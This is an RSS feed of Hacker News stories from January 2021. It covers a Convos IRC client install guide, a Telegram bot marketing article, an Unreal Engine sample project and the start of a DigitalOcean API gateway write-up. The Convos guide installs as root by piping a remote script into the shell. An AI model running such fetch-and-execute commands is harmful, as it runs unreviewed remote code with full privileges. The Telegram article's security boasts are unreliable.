<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 17 Jan 2021 17:29:49 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 17 Jan 2021 17:29:49 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Convos: The self-hosted alternative to IRCCloud]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25801002">thread link</a>) | @onerom
<br/>
January 16, 2021 | https://serhack.me/articles/convos-web-client-persistent-irc/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/convos-web-client-persistent-irc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/convos/convos.png" alt="The IRC Client: Convos"></p><p>Throughout 2020, in large part due to the lockdown, many people have started to become familiar with internal communication tools. Microsoft Teams, Slack, Telegram, Mattermost, and a few others are the most widely used and recognizable of these tools, but there still seems to be some people using Internet Relay Chat (IRC) ― one of the first online messaging services.</p><p>Many of the widely used international communication tools have been inspired by IRC, which is gradually falling into disuse due to the modern UI and UX and additional features being offered by these more well-known messaging applications.</p><p>Despite IRC being considered archaic, it is still being used today as a meeting place for many online communities. For example, people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects make IRC a place for discussion ― where it is not the identity that defines who you are, but the content.</p><p>In this article, I will illustrate what IRC is and share with you a product that greatly enhances the IRC protocol by adding features that are common to modern messaging applications. If you are searching for a convenient, self-hosted solution to connect to IRC, then this article is for you.</p><p>In the following paragraphs, we will discuss:</p><ul><li>What the IRC communication protocol is;</li><li>Getting a persistent, always-online chat on IRC;</li><li>Convos, an alternative to IRCCloud and its features;</li><li>The installation of Convos on Debian/Ubuntu; and</li><li>Convos configuration.</li></ul><h2 id="the-irc-communication-protocol">The IRC Communication Protocol</h2><p>IRC is a service that facilitates online communication via messages based on the “client-server” model. In a more technical and precise way, IRC can be considered a network protocol (at the application level) that uses a network composed of servers to easily send messages to network participants.</p><p>Developed in 1988 by Jarkko Oikkarinen, a Finnish student who wanted to create a communication system that would enable real time discussions for a network at his university, IRC quickly expanded to the point where more than 200,000 users were connected every day.</p><p>To start exchanging messages, the user must first connect to the IRC network via a client (e.g., <a href="https://www.pidgin.im/">Pidgin</a>, mIRC), which then connects to the server closest to the user in order to ensure high-speed performance. There are several networks, such as <a href="https://freenode.net/">Freenode</a>, <a href="https://www.swiftirc.net/">Swift IRC</a>, <a href="http://www.ircnet.org/">IRCNet</a>, and <a href="https://www.quakenet.org/">QuakeNet</a>.</p><p>Within IRC, you log in with a nickname (ASCII characters). This allows you to be recognized by the network to which you have connected. To initial a conversation, there are two different ways: start <strong>a private chat</strong> with another user (query) or connect to a <strong>channel</strong>.</p><p>A channel is a dedicated place to chat with a group of users, without writing to each one separately. It might sound strange nowadays, but in the late 1980s and early 1990s, this was viewed as revolutionary and a game changer with regard to how people connected over the Internet. A channel is typically administered by users, called operators, with special privileges and the ability to turn people away and invite them, make the channel private (invisible to the network), set a password, and much more.</p><p>From a technical point of view, an IRC network, currently described by the standard <a href="http://www.faqs.org/rfc/rfc1459.txt">RFC 1459</a>, is composed of several nodes maintained by a centralized entity. When a user with a special client connects to one of the servers, the whole network must be informed about the presence of this client, replicating across all servers the following: nickname, name of the host from which the client has access to the Internet, and the name of the server to which this host is connected.</p><p>Regarding the nickname, you might wonder if another person could impersonate your nickname. The solution to this problem is to register your nickname with a password, so that (in the future) the server can ask you to identify yourself with the password. Here you can read about <a href="https://meta.wikimedia.org/wiki/IRC/Instructions">How to register your nickname on Freenode</a>.</p><p>As alluded to above, from a historical point of view, IRC represents a consolidated communication protocol that is still used today as a discussion environment for people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects. In a way, this has influenced the basic UI and UX of IRC. Today, this appreciation has gone well beyond these users, as IRC has inspired our modern day messaging applications. As an example, Slack is a sexier version of IRC ― dressed up with better UI and UX and having a few modernized features. At their core, though, IRC and today’s messaging applications are no different, as groups are the channels, queries are the private chats, and operators are the administrators.</p><p>If you would like to discover all the commands to better manage your own channel, I suggest you to read <a href="https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands">the list of commands available on IRC</a>.</p><p>For a long time, IRC has been a gathering place for many communities, including Firefox, Bitcoin, Gnome, and many others. IRC has also been the site of many historic “jokes'' on the Internet. It would be remiss of me not to mention some of these most notable moments: <a href="http://bash.org/?244321">Hunter2</a>, <a href="http://bash.org/?5273">the guy who lost a device in his apartment</a>, and the timeless <a href="http://bash.org/?400459">“does anyone speak python here?"</a>.</p><figure><img src="https://imgs.xkcd.com/comics/team_chat.png"><figcaption><h4>IRC will never die (gently provided by XKCD)</h4></figcaption></figure><p>Arguably the biggest disadvantage of IRC is that you cannot always be connected to a specific server, unless you leave the client on all the time. Unlike normal messaging clients, you will not receive messages if you are not present on the IRC network. In fact, the remote nodes of IRC do not store any messages!</p><p>One of the solutions for this problem is to buy a <a href="https://en.wikipedia.org/wiki/Virtual_private_server">VPS</a> and manage the connection to IRC via a text client with a command line interface. However, this can be inconvenient on mobile devices and, specifically, for a person unfamiliar with the command line. To get around this problem, there is a free self-hosted alternative called Convos that allows you to connect via a web interface to IRC, but that’s not all!</p><h2 id="convoschat-the-solution-to-always-being-connected">Convos.chat: The Solution to Always Being Connected</h2><p><a href="https://convos.chat/">Convos</a> is an open-source, self-hosted client for connecting to IRC maintained by <a href="https://thorsen.pm/">Jan Henning Thorsen</a> and <a href="https://marcus.means.no/">Marcus</a>. The backend was developed with <a href="https://mojolicious.org/">Mojolicious</a>, a Perl framework, while the front-end used the Javascript framework <a href="https://svelte.dev/">Svelte</a>.</p><p>Developed in 2014, Convos has evolved into a very interesting project, despite being maintained by only one person. Among its main features, we find the persistent IRC connection that eliminates the risk of missing some important discussions! The user is connected as long as the Convos daemon is active and each message is stored in a log accessible only to the owner of the server.</p><p>Convos is one of the simplest ways to use IRC and it is always online, so initiating and staying in a discussion has never been easier. Its simple interface allows you to send messages on IRC from any device, be it a smartphone or a fridge ― you just need a browser. You can also choose a theme from those available or <a href="https://convos.chat/blog/2020/6/14/create-your-own-theme-detailed-walkthrough">write your own</a>. Another advantage of Convos is its self-hosted nature. There is no centralized third-party server (like with <a href="https://irccloud.com/">IRCCloud</a>) that stores your messages. With Convos, no one besides you will see your IRC messages and logs.</p><figure><img src="https://serhack.me/images/convos/screenshot.jpg"><figcaption><h4>Convos User Interface</h4></figcaption></figure><p>If you need to upload a file, but do not want to share it with third parties, Convos allows you to upload a file of any extension to your server. Drag and drop the file and Convos will do the rest, creating a unique link for you to share in order to access the file. Want to delete it? You can do it without any problem!</p><p><img src="https://serhack.me/images/convos/drag_and_drop.gif" alt="Drag and Drop per Convos"></p><p>For text files, it gets even better. All messages that will have more than four “line breaks” will be uploaded to a personalized pastebin.</p><p>As we are all well aware, in 2020, having an <a href="https://unicode.org/emoji/charts/full-emoji-list.html">Emoji</a> available is a must! Just type <code>:emoji_name</code> to see the list of emojis available on Convos. Note that all <a href="https://unicode.org/">Unicode</a> characters are also compatible, so across smartphones there will be no problems. You can also add links and make <strong>bold</strong> and/or <em>italicize</em> your posts with <a href="https://www.markdownguide.org/">Markdown</a>.</p><p>Given that IRCCloud is a service (with similar features) that is both <strong>centralized</strong> and <strong>expensive</strong>, <a href="https://convos.chat/">Convos</a> is the leading free alternative. Over the past few years, IRCCloud’s infrastructure has suffered several periods of downtime, which has impacted many (if not all) its users. Unlike IRCCloud, the expenses and stability of running a private server for Convos is more cost-efficient and reliable, especially when compared to the pricing model (per user/per month) and the fragile nature of the IRCCloud infrastructure.</p><h3 id="how-to-start-chatting-with-convos">How to Start Chatting with Convos</h3><p>Installation and configuration of Convos is very simple and does not require any special knowledge of shell scripting. The developers have prepared a very convenient way to run script, so that you will be able to install the Web client quickly.</p><div><pre><code data-lang="bash">root@nodo#: curl https://convos.chat/install.sh | sh -</code></pre></div><p>Here is the <a href="https://convos.chat/install.sh">Script code</a>, if you want to view it. If the script did not show any problems, we can proceed by starting the Convos daemon:</p><div><pre><code data-lang="bash">root@nodo#: ./convos/script/convos daemon</code></pre></div><p>Launch your browser and enter <code>http://localhost:3000</code> to start chatting. There are no additional steps. You only have to choose the IRC network (e.g. Freenode) and Convos will do the rest!</p><p>Since you will be the first user, by default you will be set up as the Convos administrator. This will allow you to manage users, reset passwords as needed or create new ones, and set some <a href="https://convos.chat/doc/config#global-config-settings">global environment variables</a> as the default Convos connection.</p><p>You can change the listening port or IP address via the <a href="https://convos.chat/doc/config#listen"><code>--listen</code></a> flag; although, it is strongly recommended to run Convos behind a proxy server.</p><p>If you want to run Convos through a proxy server, I recommend you read the guide <a href="https://convos.chat/doc/reverse-proxy">“How to Run Convos Behind Your Favourite Server”</a>. A reverse proxy is a particular application that acts as an intermediary, in this case, between the client (the user) and the Convos daemon. It is useful if you want to have features such as SSL management, load balancing, compression, and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/convos-web-client-persistent-irc/">https://serhack.me/articles/convos-web-client-persistent-irc/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/convos-web-client-persistent-irc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801002</guid>
            <pubDate>Sat, 16 Jan 2021 08:41:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Safari supports user style sheets]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800992">thread link</a>) | @SimeVidas
<br/>
January 16, 2021 | https://webplatform.news/issues/2021-01-15 | <a href="https://web.archive.org/web/*/https://webplatform.news/issues/2021-01-15">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://webplatform.news/issues/2021-01-15</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800992</guid>
            <pubDate>Sat, 16 Jan 2021 08:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is a Telegram Bot? Reasons to Use Bot for Telegram]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800876">thread link</a>) | @botpenguin
<br/>
January 16, 2021 | https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/ | <a href="https://web.archive.org/web/*/https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="im">
<div>

<p>In today’s modern era, businesses should continually evolve to keep their customers engaged to survive in a highly competitive marketplace. Formulating a better place to support your client space can work in your favor for a better future. Moreover, since CSS plays a crucial role, so level-up the UX interface with messengers and connect with the targeted audience on social media.</p>
<h2>What is this Telegram Bot?</h2>
<p>The Telegram Bot is simply accounts or profiles over Telegram operated by software which is generally powered by AI (artificial intelligence). They can literally do anything on behalf of you and your business, such as teaching, guiding, assisting, helping broadcast, reminding, connecting, integrating with other platforms, and taking users’ commands. With high-end technological engines of deep learning, machine learning, and NLP, it is possible to let a bot understand human context or tone easily and offer solutions in the meantime.</p>
<p>In simpler words,</p>
<p>“A <a href="https://botpenguin.com/chatbot-for-telegram/">Telegram Bot</a> is an AI-inspired bot that can serve companies or brands with many features such as sending out information, reminders, playing tunes, ordering, and more.”</p>
<p>The best part of Telegram is it is highly safe and lets customers have secret chats. So, now as you get to know what bot for Telegram, let’s begin with why your business needs to integrate a bot in Telegram.</p>
<p>A popular messenger such as Facebook and WhatsApp is the texting messenger. It gains high adoption rates, especially by companies, and is powerfully used after WhatsApp. Telegram is a cloud-based instant messaging system developed by the enterprise registered in London, United Kingdom.</p>
<p>This app is available for iOS, Android, Windows &amp; Desktop. It looks like Whatsapp and lets the users share data like photos, videos, audios, and other documents. Surprisingly, users may create groups of up to 200,000 people or channels for streaming to unlimited people or audience base. The best is they support an end to end encrypted voice calls.</p>
<p>We suggest you leave your brand playing on Telegram to engage a better audience base as Telegram allows users to create a telegram bot and run them through the telegram channels to complete the task. Now you could think about managing many social platforms together, so you don’t have to worry because the telegram bot can do it on your behalf.</p>
<h2>Top Reasons for Deploying Bot in Telegram</h2>
<p>Bots are getting more and more popular as third-party applications to run in a telegram environment. And a big thanks goes to Telegram And a big thank you goes to the telegram APIs, with which you quickly build telegram bot, promote them and generate them to make your platform more convenient for users.</p>
<p>“A telegram bot can simplify the conversation between the user and a machine and let them execute the task seamlessly. It helps you to engage the user for long enough, gathers necessary data, and more.”</p>
<p><img loading="lazy" src="https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-300x150.png" alt="telegram chatbot" width="580" height="291" srcset="https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-300x150.png 300w, https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot-768x384.png 768w, https://botpenguin.com/wp-content/uploads/2021/01/telegram-chat-bot.png 874w" sizes="(max-width: 580px) 100vw, 580px"></p>
<h3>It’s Free</h3>
<p>As you already know, Telegram is free, whatever the number of SMS you send or receive per day or the reason for which you use the platform (professional or personal use). This has no specific limitations and can support your company in obtaining potential customers and building a better online presence. If you are thinking of deploying or <a href="https://app.botpenguin.com/authentication">creating a bot for Telegram</a>, you do not need to spend stacks of money. The entire telegram bot construction process is also feasible and free. Therefore, whether you are a small business or a great brand getting a bot in Telegram is easy.</p>
<p>You can attract your customers with useful information, photos, videos, and even voice messages to let them build trust in your brand. Hence, have a strong marketing strategy and let your brand work effectively and efficiently.</p>
<h3>Better Engagement</h3>
<p>Telegraphic Messenger is one of the fantastic ways to promote your brand and let your audience base know who you are. When it comes to engaging customers over, you must have a clear and straightforward idea while interacting with the customers. A complicated service or tone can lead to unsatisfied customers. But here comes the twist, a telegram bot can support businesses to have a better interaction 24/7 without any further delay. With better and organized promotional campaigns, a bot for Telegram can let you raise your customer base.</p>
<p>Simplify your bot’s tone and let the conversation flow to impress the customers instantly, allow them to execute the whole purchasing process by a bot without jumping over multiple pages. A bot in Telegram can also remind the customers about the new offers, discounts, product launches, and even track of their activities and needed improvements. So, what are you waiting for, have it soon!</p>
<h3>Promotion and Advertising</h3>
<p>When you have a social media platform like Telegram, why opt for expensive advertising activities? Just a single message for your customers with the relevant information can make your brand’s presence better every day. Hence, a free telegram bot with powerful prompting tools and strategy can make your business more productive. It would also let you earn more revenue and better productivity as a whole. We know what role marketing plays in this digital world, so don’t compromise with and have the smart tools to lead you through immense success. So, be it a sale or opening of the new store you must let your customers know it.</p>
<h3>Secure</h3>
<p>The most fantastic part of Telegram is that it is highly secure, and nobody still managed to hack it. Thus its makers are proud of that fact. This makes it quite a good reason to use it for business purposes as it will safeguard all your data and your customer’s. It will give you and your costumes a secure and better place to interact regarding products and services. Hence, you can serve them with high-end technology without any hindrance. A bot for Telegram can make it possible to automate your brand’s profile and do all the repetitive tasks.</p>
<p>A can provide a quick solution and understands the context of their complaint as any other human agent.</p>
<h3>Availability</h3>
<p>The telegram messenger covers all major platforms such as Android, iOS, windows phone with desktop apps for Mac, Linux, and Windows. Furthermore, it also has a web version, which will allow you to target your prospects on a vast scale. Second, you don’t have to worry that your customers won’t access this messenger. With a telegram bot, you can let your customers have the information quickly, and they can use it from anywhere and anytime without any problem.<br>
Ease of availability increases the opportunity to find prospective buyers and higher conversion rates. Then get ready to enjoy the ultimate adventure in this digital market with the bot in Telegram.</p>
<h3>Transactions</h3>
<p>You would be surprised to be able to complete transactions using a telegram. Therefore, when you are in business, carrying out transactions of your customers happens quite frequently. In such a case, why not give a rapid and transparent platform for them to let the transactions proceed smoothly. Currently, this functionality is available in Russia and brazil. However, we believe it will soon be available in other countries as well. A telegram bot may let the client transfer money or pay for a minute without going to other pages or portals.</p>
<h3>Conclusion</h3>
<p>Telegram isn’t only the way to reach, target, and keep in touch with the prospects but also a powerful tool to automate CSS and optimize multiple processes to minimize manual work. For this, you can have a bot for Telegram responsible for a specific role and let it work without any human intervention. In case you are confused about how to own a telegram bot, you must visit BotPenguin and have a smart bot instantly.</p>

</div>
</div><div>

<p>Bhavya works as Digital Marketing Team Lead and looks closely into the marketing team. Her passion and expertise in refurbishing the way users connect to the product leads to ultimate satisfaction via SEO friendly content.
</p>
</div></div>]]>
            </description>
            <link>https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800876</guid>
            <pubDate>Sat, 16 Jan 2021 08:08:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New ‘Action Roguelike’ C++ Project on GitHub]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25800771">thread link</a>) | @todsacerdoti
<br/>
January 15, 2021 | https://www.tomlooman.com/action-roguelike-cpp-ue4/ | <a href="https://web.archive.org/web/*/https://www.tomlooman.com/action-roguelike-cpp-ue4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>For the <a rel="noreferrer noopener" href="https://www.tomlooman.com/stanford-cs193u/" target="_blank">Stanford University Fall 2020 Curriculum</a>, I built a small game project using mainly C++ mixed with some Blueprint in Unreal Engine. For those interested, the entire Computer Science course (CS193U) was provided through Zoom lectures and has been recorded. I’m working on getting this published and meanwhile, this project is already <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">open-source through GitHub</a> to be taken apart by anyone! </p>
<div><figure><img loading="lazy" width="900" height="490" src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1" alt="" srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" data-lazy-src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p>
<h2>Description</h2>
<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I’m sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn’t a whole lot that makes this a real ‘roguelike’ with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‘Action Roguelike’.</p>
<figure><p>
<iframe title="Action Roguelike Combat Sample [Unreal Engine]" width="900" height="506" src="https://www.youtube.com/embed/8jDCtT88bdk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>
<figure><p>
<iframe title="CS193U: Blackhole Projectile Assignment Example" width="900" height="506" src="https://www.youtube.com/embed/uSOEPkX3OtI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>
<h2>Features</h2>
<p>Below I’ve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>
<ul><li>Third-person Action Character Movement</li><li><strong>Action System</strong>&nbsp;(Gameplay Ability System-lite)<ul><li>Dash Ability (Teleporting via projectile)</li><li>Blackhole Ability</li><li>Magic Projectile Attack</li><li>“Thorns” buff (reflecting damage)</li><li>Burning Damage-over-time effect</li></ul></li><li>AttributeComponent (Health, Rage etc.)</li><li><strong>SaveGame System</strong>&nbsp;for persisting progress of character and world state.</li><li>Heavy use of Events to drive UI and gameplay reactions.</li><li>Mix of C++ &amp; Blueprint and how to combine these effectively.</li><li><strong>GameplayTags</strong> to mark-up Actors, Buffs, Actions.</li><li><strong>Multiplayer support</strong>&nbsp;for all features</li><li>GameMode Logic<ul><li>EQS for binding bot/powerup spawn locations.</li><li>Bot spawning system (bots cost points to spawn, gamemode gains points over time to spend)</li><li>DataTable holds bot information</li><li>DataAssets to hold enemy configurations</li></ul></li><li><strong>Asset Manager:</strong>&nbsp;Async loading of data assets</li><li>Async loading of UI icons</li><li>AI (Ranged Shooter style)<ul><li>Minion AI with Behavior Trees (Roam, See, Chase, Attack, Flee/Heal)</li><li>C++ Custom Behavior Trees Nodes</li><li>EQS for attack/cover locations by AI Powerups</li></ul></li><li>Powerup pickups to heal, gain credits/actions (UMG)</li><li>Main menu to host/join game (UMG)</li><li>UI elements for player attributes and projected widgets for powerups and enemy health.</li><li>C++ Localized Text Example</li></ul>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p>
<div><figure><img loading="lazy" width="900" height="463" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Spotted by Minion’s sight sense.</figcaption></figure></div>
<div><figure><img loading="lazy" width="900" height="532" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Behavior Tree for Ranged Minion AI</figcaption></figure></div>
<h2>What’s Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors – including the final shape of the existing course recordings.</p>
<!-- #js-embed-sendy.embed-sendy -->
</div></div>]]>
            </description>
            <link>https://www.tomlooman.com/action-roguelike-cpp-ue4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800771</guid>
            <pubDate>Sat, 16 Jan 2021 07:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean's API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25800237">thread link</a>) | @chynkm
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
